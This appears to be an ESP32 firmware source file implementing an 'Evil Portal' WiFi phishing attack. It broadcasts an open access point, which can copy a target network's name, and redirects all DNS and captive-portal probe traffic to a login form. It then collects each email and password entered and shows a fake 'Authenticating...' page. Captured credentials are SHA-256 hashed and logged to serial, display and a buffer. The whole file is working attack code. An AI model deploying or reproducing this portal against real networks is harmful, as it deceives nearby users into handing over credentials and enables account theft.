#include "EvilPortal.h"
#include "mbedtls/sha256.h"

WebServer server(80);

char apName[MAX_AP_NAME_SIZE] = "PORTAL";
char index_html[MAX_HTML_SIZE] = "<!DOCTYPE html><html><head><meta name='viewport' content='width=device-width, initial-scale=1'></head><body><h1>DIAGNOSTIC PORTAL</h1><p>If you see this, the Web Server is <b>ALIVE</b>.</p><hr><form action='/get' method='GET'>Email: <input type='text' name='email' required><br>Pass: <input type='password' name='password' required><br><button type='submit'>SUBMIT TEST</button></form></body></html>";

extern "C" int ets_printf(const char *fmt, ...);

EvilPortal::EvilPortal() {
  ets_printf("[CONSTRUCTOR] EvilPortal\n");
}

void EvilPortal::setup() {
  this->runServer = false;
  this->name_received = false;
  this->password_received = false;
  this->has_html = false;
  this->has_ap = false;

  html_files = new LinkedList<String>();

  html_files->add("Back");

  #ifdef HAS_SD
    if (sd_obj.supported) {
      sd_obj.listDirToLinkedList(html_files, "/", "html");

      Serial.println("Evil Portal Found " + (String)html_files->size() + " HTML files");
    }
  #endif
}

bool EvilPortal::begin(LinkedList<ssid>* ssids, LinkedList<AccessPoint>* access_points) {
  Serial.println("[EP] Starting begin()...");
  if (!this->setAP(ssids, access_points)) {
    Serial.println("[EP] setAP failed");
    return false;
  }
  if (!this->setHtml()) {
    Serial.println("[EP] setHtml failed");
    return false;
  }
    
  Serial.println("[EP] Calling startPortal()...");
  this->startPortal(ssids, access_points);

  return true;
}

String EvilPortal::get_user_name() {
  return this->user_name;
}

String EvilPortal::get_password() {
  return this->password;
}

void EvilPortal::setupServer() {
  server.on("/", [this]() {
    ets_printf("[EP] Route / hit\n");
    server.send_P(200, "text/html", index_html);
    ets_printf("[EP] html sent to client\n");
    #ifdef HAS_SCREEN
      this->sendToDisplay("Client connected to server");
    #endif
  });

  // Captive Portal Probes (Redirection to /)
  server.on("/generate_204", [this]() { ets_printf("[EP] Probe /generate_204\n"); server.sendHeader("Location", "/", true); server.send(302, "text/plain", ""); }); // Android
  server.on("/hotspot-detect.html", [this]() { ets_printf("[EP] Probe /hotspot-detect.html\n"); server.sendHeader("Location", "/", true); server.send(302, "text/plain", ""); }); // Apple
  server.on("/library/test/success.html", [this]() { ets_printf("[EP] Probe /success.html\n"); server.sendHeader("Location", "/", true); server.send(302, "text/plain", ""); }); // Apple
  server.on("/ncsi.txt", [this]() { ets_printf("[EP] Probe /ncsi.txt\n"); server.sendHeader("Location", "/", true); server.send(302, "text/plain", ""); }); // Windows
  server.on("/success.txt", [this]() { ets_printf("[EP] Probe /success.txt\n"); server.send(200, "text/plain", "success"); }); // Windows probe

  server.on("/get", [this]() {
    ets_printf("[EP] Route /get hit\n");
    if (server.hasArg("email")) {
      user_name = server.arg("email");
      name_received = true;
    }

    if (server.hasArg("password")) {
      password = server.arg("password");
      password_received = true;
    }

    if (name_received && password_received) {
      String hashed_user = this->getSHA256(user_name);
      String hashed_pass = this->getSHA256(password);
      
      ets_printf("[EP] CREDENTIALS CAPTURED (HASHED):\n");
      ets_printf("[EP] User Hash: %s\n", hashed_user.c_str());
      ets_printf("[EP] Pass Hash: %s\n", hashed_pass.c_str());
      
      #ifdef HAS_SCREEN
        this->sendToDisplay("Credentials Captured (Hashed)");
      #endif
    }
    
    server.send(200, "text/html", "<html><head><meta name='viewport' content='width=device-width, initial-scale=1'><style>body{font-family:sans-serif;background:#f0f2f5;display:flex;justify-content:center;align-items:center;height:100vh;margin:0;text-align:center}.loader{border:8px solid #f3f3f3;border-top:8px solid #1a73e8;border-radius:50%;width:50px;height:50px;animation:spin 2s linear infinite;margin:20px auto}@keyframes spin{0%{transform:rotate(0deg)}100%{transform:rotate(360deg)}}</style></head><body><div class='card'><h2>Authenticating...</h2><div class='loader'></div><p>Please wait while we verify your credentials and connect you to the network.</p></div></body></html>");
  });

  server.onNotFound([this]() {
    server.sendHeader("Location", "/", true);
    server.send(302, "text/plain", "");
  });

  Serial.println("web server up");
}

void EvilPortal::setHtmlFromSerial() {
  Serial.println("Setting HTML from serial...");
  const char *htmlStr = Serial.readString().c_str();
  strncpy(index_html, htmlStr, strlen(htmlStr));
  this->has_html = true;
  this->using_serial_html = true;
  Serial.println("html set");
}

bool EvilPortal::setHtml() {
  if (this->using_serial_html) {
    Serial.println("html previously set");
    return true;
  }
  Serial.println("Setting HTML...");
  #ifdef HAS_SD
    File html_file = sd_obj.getFile("/" + this->target_html_name);
  #else
    File html_file;
  #endif
  if (!html_file) {
    ets_printf("[EP] Could NOT find /%s. Using default internal HTML.\n", this->target_html_name.c_str());
    this->has_html = true;
    return true;
  }
  else {
    if (html_file.size() > MAX_HTML_SIZE) {
      #ifdef HAS_SCREEN
        this->sendToDisplay("The given HTML is too large.");
        this->sendToDisplay("The Byte limit is " + (String)MAX_HTML_SIZE);
        this->sendToDisplay("Touch to exit...");
      #endif
      Serial.println("The provided HTML is too large. Byte limit is " + (String)MAX_HTML_SIZE + "\nUse stopscan...");
      return false;
    }
    String html = "";
    while (html_file.available()) {
      char c = html_file.read();
      if (isPrintable(c))
        html.concat(c);
    }
    strncpy(index_html, html.c_str(), MAX_HTML_SIZE);
    index_html[MAX_HTML_SIZE - 1] = '\0'; // Ensure null-termination
    this->has_html = true;
    Serial.println("html set");
    html_file.close();
    return true;
  }

}

bool EvilPortal::setAP(LinkedList<ssid>* ssids, LinkedList<AccessPoint>* access_points) {
  // See if there are selected APs first
  String ap_config = "";
  String temp_ap_name = "";
  for (int i = 0; i < access_points->size(); i++) {
    if (access_points->get(i).selected) {
      temp_ap_name = access_points->get(i).essid;
      break;
    }
  }
  // If there are no SSIDs and there are no APs selected, pull from file
  // This means the file is last resort
  if ((ssids->size() <= 0) && (temp_ap_name == "")) {
    #ifdef HAS_SD
      File ap_config_file = sd_obj.getFile("/ap.config.txt");
    #else
      File ap_config_file;
    #endif
    // Could not open config file. return false
    if (!ap_config_file) {
      Serial.println("Could not find /ap.config.txt. Using default AP name: " + (String)apName);
      ap_config = apName;
    }
    // Config file good. Proceed
    else {
      // ap name too long. return false        
      if (ap_config_file.size() > MAX_AP_NAME_SIZE) {
        #ifdef HAS_SCREEN
          this->sendToDisplay("The given AP name is too large.");
          this->sendToDisplay("The Byte limit is " + (String)MAX_AP_NAME_SIZE);
          this->sendToDisplay("Touch to exit...");
        #endif
        Serial.println("The provided AP name is too large. Byte limit is " + (String)MAX_AP_NAME_SIZE + "\nUse stopscan...");
        return false;
      }
      // AP name length good. Read from file into var
      while (ap_config_file.available()) {
        char c = ap_config_file.read();
        Serial.print(c);
        if (isPrintable(c)) {
          ap_config.concat(c);
        }
      }
      #ifdef HAS_SCREEN
        this->sendToDisplay("AP name from config file");
        this->sendToDisplay("AP name: " + ap_config);
      #endif
      Serial.println("AP name from config file: " + ap_config);
      ap_config_file.close();
    }
  }
  // There are SSIDs in the list but there could also be an AP selected
  // Priority is SSID list before AP selected and config file
  else if (ssids->size() > 0) {
    ap_config = ssids->get(0).essid;
    if (ap_config.length() > MAX_AP_NAME_SIZE) {
      #ifdef HAS_SCREEN
        this->sendToDisplay("The given AP name is too large.");
        this->sendToDisplay("The Byte limit is " + (String)MAX_AP_NAME_SIZE);
        this->sendToDisplay("Touch to exit...");
      #endif
      Serial.println("The provided AP name is too large. Byte limit is " + (String)MAX_AP_NAME_SIZE + "\nUse stopscan...");
      return false;
    }
    #ifdef HAS_SCREEN
      this->sendToDisplay("AP name from SSID list");
      this->sendToDisplay("AP name: " + ap_config);
    #endif
    Serial.println("AP name from SSID list: " + ap_config);
  }
  else if (temp_ap_name != "") {
    if (temp_ap_name.length() > MAX_AP_NAME_SIZE) {
      #ifdef HAS_SCREEN
        this->sendToDisplay("The given AP name is too large.");
        this->sendToDisplay("The Byte limit is " + (String)MAX_AP_NAME_SIZE);
        this->sendToDisplay("Touch to exit...");
      #endif
      Serial.println("The given AP name is too large. Byte limit is " + (String)MAX_AP_NAME_SIZE + "\nUse stopscan...");
    }
    else {
      ap_config = temp_ap_name;
      #ifdef HAS_SCREEN
        this->sendToDisplay("AP name from AP list");
        this->sendToDisplay("AP name: " + ap_config);
      #endif
      Serial.println("AP name from AP list: " + ap_config);
    }
  }
  else {
    Serial.println("Could not configure Access Point. Use stopscan...");
    #ifdef HAS_SCREEN
      this->sendToDisplay("Could not configure Access Point.");
      this->sendToDisplay("Touch to exit...");
    #endif
  }

  if (ap_config != "") {
    strncpy(apName, ap_config.c_str(), MAX_AP_NAME_SIZE);
    this->has_ap = true;
    Serial.println("ap config set");
    return true;
  }
  else
    return false;

}

void EvilPortal::startAP() {
  const IPAddress AP_IP(172, 0, 0, 1);

  Serial.print("starting ap ");
  Serial.println(apName);

  WiFi.mode(WIFI_AP);
  WiFi.softAPConfig(AP_IP, AP_IP, IPAddress(255, 255, 255, 0));
  WiFi.softAP(apName);

  #ifdef HAS_SCREEN
    this->sendToDisplay("AP started");
  #endif

  Serial.print("ap ip address: ");
  Serial.println(WiFi.softAPIP());

  this->setupServer();

  this->dnsServer.start(53, "*", WiFi.softAPIP());
  server.begin();
  #ifdef HAS_SCREEN
    this->sendToDisplay("Evil Portal READY");
  #endif
}

void EvilPortal::startPortal(LinkedList<ssid>* ssids, LinkedList<AccessPoint>* access_points) {
  const IPAddress AP_IP(192, 168, 4, 1);
  const IPAddress AP_NET(255, 255, 255, 0);

  Serial.println("[EP] Configuring SoftAP...");

  #ifdef MARAUDER_FLIPPER_C5
    WiFi.setTxPower(WIFI_POWER_8_5dBm);
    ets_printf("[EP] TX Power reduced to 8.5dBm\n");
  #endif

  ets_printf("[EP] Free Heap before AP start: %u\n", ESP.getFreeHeap());

  // Robust initialization sequence: Disconnect -> Mode -> Config -> Start
  WiFi.disconnect(true);
  delay(200);

  // Using AP_STA for better dual-interface stability on C5/S3
  WiFi.mode(WIFI_AP_STA);
  ets_printf("[EP] WiFi Mode set (AP_STA). Waiting 1s for radio...\n");
  delay(1000); 

  // Simplified config for C5 stability (Defaulting to 192.168.4.1)
  // if (!WiFi.softAPConfig(AP_IP, AP_IP, AP_NET)) {
  //   ets_printf("[EP] ERROR: softAPConfig failed!\n");
  // }
  
  // Use the channel from the first target if available, default to 1
  int ep_channel = 1;
  if (ssids != nullptr && ssids->size() > 0)
    ep_channel = ssids->get(0).channel;
  
  ets_printf("[EP] Attempting WiFi.softAP on channel %d...\n", ep_channel);
  bool success = WiFi.softAP(apName, "", ep_channel);
  
  if (success) {
    ets_printf("[EP] SoftAP success: %s\n", apName);
    ets_printf("[EP] AP IP Address: %s\n", WiFi.softAPIP().toString().c_str());
  } else {
    ets_printf("[EP] ERROR: SoftAP failed to start.\n");
    return;
  }

  #ifdef MARAUDER_FLIPPER_C5
    WiFi.setTxPower(WIFI_POWER_8_5dBm);
    ets_printf("[EP] C5 TX Power stabilized at 8.5dBm\n");
  #endif

  // Diagnostic WiFi Events
  WiFi.onEvent([](WiFiEvent_t event, WiFiEventInfo_t info){
    if (event == ARDUINO_EVENT_WIFI_AP_STACONNECTED) {
      ets_printf("[EP] CLIENT CONNECTED!\n");
    } else if (event == ARDUINO_EVENT_WIFI_AP_STADISCONNECTED) {
      ets_printf("[EP] CLIENT DISCONNECTED!\n");
    }
  });

  ets_printf("[EP] Starting DNS Server...\n");
  dnsServer.start(53, "*", WiFi.softAPIP());
  ets_printf("[EP] DNS Server up\n");

  this->setupServer();
  ets_printf("[EP] Server configured. Opening socket...\n");

  server.begin();
  this->runServer = true;
  this->has_ap = true;
  ets_printf("[EP] PORTAL READY AND LISTENING\n");
  Serial.println("[EP] Web Server started. Manual IP: 192.168.4.1");
}

String EvilPortal::getSHA256(String data) {
  unsigned char hash[32];
  mbedtls_sha256((const unsigned char*)data.c_str(), data.length(), hash, 0);
  
  String hashStr = "";
  for (int i = 0; i < 32; i++) {
    char hex[3];
    sprintf(hex, "%02x", hash[i]);
    hashStr += hex;
  }
  return hashStr;
}

void EvilPortal::sendToDisplay(String msg) {
  #ifdef HAS_SCREEN
    String display_string = "";
    display_string.concat(msg);
    int temp_len = display_string.length();
    for (int i = 0; i < 40 - temp_len; i++)
    {
      display_string.concat(" ");
    }
    display_obj.loading = true;
    display_obj.display_buffer->add(display_string);
    display_obj.loading = false;
  #endif
}

void EvilPortal::main(uint8_t scan_mode) {
  // Heartbeat every 1000ms - MOVED OUTSIDE FOR DEEP DIAGNOSTIC
  static uint32_t last_diagnostic = 0;
  if (millis() - last_diagnostic > 1000) {
    ets_printf("\n[EP-DEBUG] Mode: %u, AP: %d, HTML: %d, RAM: %u\n", 
                  scan_mode, this->has_ap, this->has_html, ESP.getFreeHeap());
    last_diagnostic = millis();
  }

  if ((scan_mode == WIFI_SCAN_EVIL_PORTAL) && (this->has_ap) && (this->has_html)){
    this->dnsServer.processNextRequest();
    server.handleClient();
    
    if (this->name_received && this->password_received) {
      this->name_received = false;
      this->password_received = false;
      
      String hashed_user = this->getSHA256(this->user_name);
      String hashed_pass = this->getSHA256(this->password);
      
      String logValue1 = "u: " + hashed_user;
      String logValue2 = "p: " + hashed_pass;
      String full_string = logValue1 + " " + logValue2 + "\n";
      
      ets_printf("[EP] RECORDING HASHED CREDENTIALS...\n");
      Serial.print(full_string);
      buffer_obj.append(full_string);
      
      #ifdef HAS_SCREEN
        this->sendToDisplay("Data Hashed & Saved");
      #endif
    }
  }
}
